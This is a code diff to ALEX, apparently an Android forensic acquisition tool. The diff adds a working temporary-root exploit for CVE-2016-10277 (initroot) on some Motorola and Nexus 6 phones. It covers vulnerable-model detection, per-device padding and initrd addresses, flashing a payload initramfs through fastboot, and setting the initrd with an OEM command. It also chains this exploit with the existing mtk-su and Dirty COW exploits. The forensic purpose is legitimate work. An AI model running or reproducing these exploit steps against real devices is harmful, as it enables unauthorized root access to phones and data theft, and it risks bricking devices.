@@ -17,6 +17,7 @@ from adbutils._utils import append_path
 from io import BytesIO
 from pathlib import Path, PurePosixPath
 from pdfme import build_pdf
+import alex.fastboot as fastboot
 import alex.ufed_style as ufed_style
 import alex.devdump as devdump
 import alex.wifi_adb as wifi_adb
@@ -313,6 +314,7 @@ class MyApp(ctk.CTk):
             itext = ("Please wait ...\n" +
                         "\n" + '{:13}'.format("Python: ") + "\t" + platform.python_version() +
                         "\n" + '{:13}'.format("adbutils: ") + "\t" + version('adbutils') +
+                        "\n" + '{:13}'.format("fastboot: ") + "\t" + fb_found +
                         "\n\n" + 
                         "   54 68 65 20 52 6f 61 64 20 67 6f \n" +
                         "   65 73 20 65 76 65 72 20 6f 6e 20 \n" +
@@ -932,7 +934,7 @@ class MyApp(ctk.CTk):
     
 
     #Show the Check Root
-    def show_check_root(self):
+    def show_check_root(self, skip_2016_10277 = False, skip_2020_0069 = False, skip_2016_5195 = False):
         ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
         ctk.CTkLabel(self.dynamic_frame, text="", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
         self.text = ctk.CTkLabel(self.dynamic_frame, text="Checking the root state ...", width=585, height=60, font=self.stfont, anchor="w", justify="left")
@@ -942,6 +944,8 @@ class MyApp(ctk.CTk):
         global mtk_su
         global c_su
         mtk_su = False
+        m_init_device = self.check_initroot()
+        print(m_init_device)
         self.change = ctk.IntVar(self, 0)
         print(show_root)
         if show_root == False:
@@ -963,7 +967,35 @@ class MyApp(ctk.CTk):
                     self.text.configure(text="Root access has not been confirmed.")
                     self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))
                     return
-            elif any(d_platform.upper().startswith(mtk_vers) for mtk_ver in mtk_vers):
+            elif not skip_2016_10277 and m_init_device:
+                self.choose = ctk.BooleanVar(self, False)
+                self.text.configure(text="This device may be vulnerable to CVE-2016-10277 (initroot).\nFor temporary root access, a custom initramfs can be loaded via fastboot.\nThere is a risk of causing a boot loop.\n\nDo you want to continue?")
+                self.yesb = ctk.CTkButton(self.dynamic_frame, text="YES", font=self.stfont, command=lambda: self.choose.set(True))
+                self.yesb.pack(side="left", pady=(20,330), padx=140)
+                self.nob = ctk.CTkButton(self.dynamic_frame, text="NO", font=self.stfont, command=lambda: self.choose.set(False))
+                self.nob.pack(side="left", pady=(20,330))    
+                self.wait_variable(self.choose)  
+                self.yesb.pack_forget()
+                self.nob.pack_forget()
+                if self.choose.get() == True:
+                    self.text.configure(text="Attempt to gain temp-root via CVE-2016-10277 (initroot).\nPlease Wait ...")
+                    check_ir = threading.Thread(target=lambda:temp_initroot(self.change, self.text, m_init_device))
+                    check_ir.start()
+                    print("initroot tried")
+                    self.wait_variable(self.change)
+                    if self.change.get() == 1:
+                        show_root = True
+                    else:
+                        skip_2016_10277 = True
+                        self.text.configure(text="Root access has not been gained.")
+                        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=20))
+                        self.after(110, lambda: ctk.CTkButton(self.dynamic_frame, text="Next Exploit", font=self.stfont, command=lambda: self.switch_menu("CheckRoot", skip_2016_10277=skip_2016_10277)).pack())
+                        return
+                else:
+                    self.switch_menu("AcqMenu")
+                    return
+
+            elif not skip_2020_0069 and any(d_platform.upper().startswith(mtk_vers) for mtk_ver in mtk_vers):
                 if int(software.split(".")[0]) < 10 and spl < "2020-03-01":
                     self.choose = ctk.BooleanVar(self, False)
                     self.text.configure(text="This device may be vulnerable to CVE-2020-0069 (mtk-su).\nFor temporary root access, mtk-su can be copied to the device's\ntmp directory and executed.\n\nDo you want to continue?")
@@ -984,13 +1016,15 @@ class MyApp(ctk.CTk):
                             show_root = True
                             mtk_su = True
                         else:
+                            skip_2020_0069 = True
                             self.text.configure(text="Root access has not been gained.\nDue to the nature of this process, another attempt may be successful.")
-                            self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))
+                            self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=20))
+                            self.after(110, lambda: ctk.CTkButton(self.dynamic_frame, text="Next Exploit", font=self.stfont, command=lambda: self.switch_menu("CheckRoot", skip_2016_10277=skip_2016_10277, skip_2020_0069=skip_2020_0069)).pack())
                             return
                     else:
                         self.switch_menu("AcqMenu")
                         return
-            elif int(software.split(".")[0]) < 7 and spl < "2016-11-06":
+            elif not skip_2016_5195 and int(software.split(".")[0]) < 7 and spl < "2016-11-06":
                 self.choose = ctk.BooleanVar(self, False)
                 self.text.configure(text="This device may be vulnerable to CVE-2016-5195 (Dirty COW).\nFor temporary root access, an executable can be copied to the device's\ntmp directory and executed.\n\nDo you want to continue?")
                 self.yesb = ctk.CTkButton(self.dynamic_frame, text="YES", font=self.stfont, command=lambda: self.choose.set(True))
@@ -1010,8 +1044,11 @@ class MyApp(ctk.CTk):
                         show_root = True
                         dshell = True
                     else:
+                        skip_2020_0069 = skip_2020_0069
+                        skip_2016_5195 = True
                         self.text.configure(text="Root access has not been gained.\nDue to the nature of this process, another attempt may be successful.")
-                        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))
+                        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=20))
+                        self.after(110, lambda: ctk.CTkButton(self.dynamic_frame, text="Next Exploit", font=self.stfont, command=lambda: self.switch_menu("CheckRoot", skip_2016_10277=skip_2016_10277, skip_2020_0069=skip_2020_0069, skip_2016_5195=skip_2016_5195)).pack())
                         return
 
             elif su_app == None:
@@ -1249,6 +1286,33 @@ class MyApp(ctk.CTk):
             self.text.configure(text="\n\nThis device isn't vulnerable to CVE-2024-0044.", anchor="center")
             self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("Exploits")).pack(pady=40))
             return
+
+    def check_initroot(self):
+        if spl < "2017-05-01":
+            if "google/shamu" in fingerprint:
+                return "shamu"
+            elif "motorola" in fingerprint:
+                if model.upper() == "XT1033":
+                    return "falcon"
+                elif model.upper() == "XT1040":
+                    return "peregrine"
+                elif model.upper() == "XT1068":
+                    return "titan_retbr"
+                elif model.upper() == "XT1078":
+                    return "thea"
+                elif model.upper() == "XT1607":
+                    return "harpia"
+                elif model.upper() == "XT1622":
+                    return "athene"
+                elif model.upper() == "XT1676":
+                    return "cedric"
+                else:
+                    return None
+            else:
+                return None
+        else:
+            return None
+
 
     #Show rooted Backup Options
     def show_root_acq_menu(self):
@@ -3019,6 +3083,7 @@ def get_client(host=default_host, port=default_port, check=False):
             device_info = nodevice_text = ("No device detected!\n" +
                     "\n" + '{:13}'.format("Python: ") + "\t" + platform.python_version() +
                     "\n" + '{:13}'.format("adbutils: ") + "\t" + version('adbutils') +
+                    "\n" + '{:13}'.format("fastboot: ") + "\t" + fb_found +
                     "\n\n" + 
                     "   54 68 65 20 52 6f 61 64 20 67 6f \n" +
                     "   65 73 20 65 76 65 72 20 6f 6e 20 \n" +
@@ -3094,6 +3159,8 @@ def get_client(host=default_host, port=default_port, check=False):
             spl = get_prop_fallback(props, "ro.build.version.security_patch")
             global abi
             abi = get_prop_fallback(props, "ro.product.cpu.abi")
+            global fingerprint
+            fingerprint = get_prop_fallback(props, "ro.bootimage.build.fingerprint")
             global locale
             locale = get_prop_fallback(props, "persist.sys.locale")
             if locale in [None,"","-"," "]:
@@ -5119,6 +5186,94 @@ def temp_dirty_cow(change, timeout=30):
         change.set(2)
         return False
 
+def temp_initroot(change, text, m_init_device, timeout=30):
+    paddings ={"shamu":         [0x0, 0x11000000],
+               "cedric":        [0x02000000, 0xA0100000],
+               "athene":        [0x02000000, 0x90000000],
+               "harpia":        [0x04000000, 0x90000000],
+               "thea":          [0x04000000, 0x11000000],
+               "peregrine":     [0x04000000, 0x11000000],
+               "falcon":        [0x04000000, 0x11000000],
+               "titan_retbr":   [0x04000000, 0x11000000],}
+
+    b_info_text = "Attempt to gain temp-root via CVE-2016-10277 (initroot).\nPlease Wait ..."
+    info_text = f"{b_info_text}\n\nCurrent step: Reboot to fastboot"
+    text.configure(text=info_text)
+    device.shell("reboot bootloader")
+    time.sleep(4)
+    wait_start = time.time()
+    while not fb.is_device_connected():
+        time.sleep(1)
+        if time.time() - wait_start > timeout:
+            break
+    if fb.is_device_connected():
+        info_text = f"{b_info_text}\n\nCurrent step: Found device in fastboot mode"
+        text.configure(text=info_text)
+        padding = paddings.get(m_init_device)[0]
+        scratch = paddings.get(m_init_device)[1]
+        initrd_address = f"0x{scratch + padding:08X}"
+        payload = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2016-10277", "payload", m_init_device, "payload.cpio.gz")
+        init_payload = Path(payload)
+        initram_size = init_payload.stat().st_size
+        with tempfile.NamedTemporaryFile(suffix=".img", delete=False) as tmp:
+            temp_path = Path(tmp.name)
+            tmp.seek(padding)
+            with init_payload.open("rb") as src:
+                while chunk := src.read(1024 * 1024):
+                    tmp.write(chunk)
+            tmp.truncate(padding + initram_size)
+
+        info_text = f"{b_info_text}\n\nCurrent step: Sending modified initramfs"
+        text.configure(text=info_text)
+        fb.run("flash", "aleph", str(temp_path))
+        time.sleep(4)
+        temp_path.unlink(missing_ok=True)
+        info_text = f"{b_info_text}\n\nCurrent step: Set initrd address"
+        text.configure(text=info_text)
+        result = fb.run("oem", "config", "fsg-id", f"a initrd={initrd_address},{initram_size}")
+        time.sleep(2)
+        print(result)
+        fb.run("continue")
+        time.sleep(2)
+        info_text = f"{b_info_text}\n\nCurrent step: Reboot device"
+        text.configure(text=info_text)
+        if wait_for_adb(device, timeout=40):
+            log("device rebooted")
+            change.set(1)
+        else:
+            log("device lost after fastboot")
+            change.set(2)
+    else:
+        change.set(2)
+
+def fix_initroot_bootloop(change, text, timeout=30):
+
+    b_info_text = "Rebooting into fastboot.\nPlease Wait ..."
+    info_text = f"{b_info_text}\n\nCurrent step: Reboot to fastboot"
+    text.configure(text=info_text)
+    device.shell("reboot bootloader")
+    time.sleep(4)
+    wait_start = time.time()
+    while not fb.is_device_connected():
+        time.sleep(1)
+        if time.time() - wait_start > timeout:
+            break
+    if fb.is_device_connected():
+
+        result = fb.run("oem", "config", "fsg-id", f"a initrd=\"\"")
+        time.sleep(2)
+        print(result)
+        fb.run("continue")
+        time.sleep(2)
+        if wait_for_adb(device, timeout=40):
+            log("device rebooted")
+            change.set(1)
+        else:
+            log("device lost after fastboot")
+            change.set(2)
+    else:
+        change.set(2)
+
 def temp_mtk_su(change, timeout=30):
     result_holder = {"value": None}
     if "armeabi" in abi:
@@ -5145,6 +5300,19 @@ def temp_mtk_su(change, timeout=30):
     else:
         change.set(2)
         return True
+
+def wait_for_adb(device, timeout=40, interval=1):
+    start = time.monotonic()
+
+    while time.monotonic() - start < timeout:
+        try:
+            device.shell("echo ready")
+            return True
+        except Exception:
+            pass
+        time.sleep(interval)
+
+    return False
 
 #ALEX "logging"
 def log(text):
@@ -5182,6 +5350,8 @@ def sanitize_for_pdf(text) -> str:
 
 device = None
 device_auto = None
+fb = fastboot.Fastboot()
+fb_found = "found" if fb.available else "not found"
 zytotal =0
 paired = False
 apps = []
